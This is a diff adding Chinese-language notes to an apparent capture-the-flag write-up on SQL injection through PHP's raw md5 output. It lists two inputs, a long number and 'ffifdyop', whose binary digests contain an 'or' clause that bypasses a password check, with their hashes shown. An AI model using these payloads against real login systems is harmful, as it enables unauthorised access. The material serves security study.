@@ -23,3 +23,25 @@ Hint: "select * from `admin` where password='".md5($pass,true)."'"
 
 - TRUE - 原始 16 字符二进制格式
 - FALSE - 默认 32 字符十六进制数
+
+例如输入为: `asdf` 时
+
+得到md5为 `912ec803b2ce49e4a541068d495ab570` 这是false的情况
+
+得到的16字符为 `.È²ÎIä¥AIZµp` 这是true的情况
+
+当转换出的字符能够进行sql注入时即可提取flag
+
+当输入为`129581926211651571912466741651878684928`或`ffifdyop`均能得到flag
+
+```
+129581926211651571912466741651878684928
+md5: 06da5430449f8f6f23dfc1276f722738
+ascii: ÚT0Do#ßÁ'or'8
+```
+
+```
+ffifdyop
+md5: 276f722736c95d99e921722cf9ed621c
+ascii: 'or'6É]é!r,ùíb
+```
